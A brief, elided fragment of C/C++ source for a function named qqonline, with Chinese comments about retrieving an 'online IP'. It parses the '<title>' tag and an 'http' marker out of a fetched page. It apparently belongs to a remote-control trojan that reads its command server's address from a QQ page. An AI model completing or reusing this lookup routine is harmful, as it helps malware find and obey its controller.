...
BOOL qqonline(LPCTSTR str)    //QQ	上线
{
	///////////////////////////////上线ip的获取//////////////////////////////////////
		...
		try
		{
			...
			DWORD SizePoint;
			SizePoint = memfind(chBuff1,"<title>",sizeof(chBuff1),0);		//查找开始位置

			substr(chBuff1,SizePoint+8,40);
			
			int i = memfind(chBuff1, "[http", sizeof(chBuff1), 0);		//查找结束位置
